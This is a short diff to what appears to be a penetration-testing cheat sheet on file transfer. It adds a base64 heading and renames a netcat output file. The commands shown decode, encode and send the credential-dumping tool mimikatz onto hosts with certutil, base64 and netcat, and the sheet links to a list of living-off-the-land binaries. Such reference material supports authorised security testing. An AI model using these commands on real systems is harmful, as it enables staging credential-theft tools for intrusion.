@@ -117,6 +117,9 @@ https://twitter.com/egre55/status/1087685529016193025
 
 `certutil.exe -decode mimikatz.txt mimikatz.exe`
 
+
+## base64
+
 `cat binary.exe | base64 -w 0`
 
 `echo {base64_data} | base64 -d > binary.exe`
@@ -154,7 +157,7 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 
 ## netcat
 
-`nc -nlvp 8000 > mimi_incoming.exe`
+`nc -nlvp 8000 > mimikatz.exe`
 
 `nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe`
 
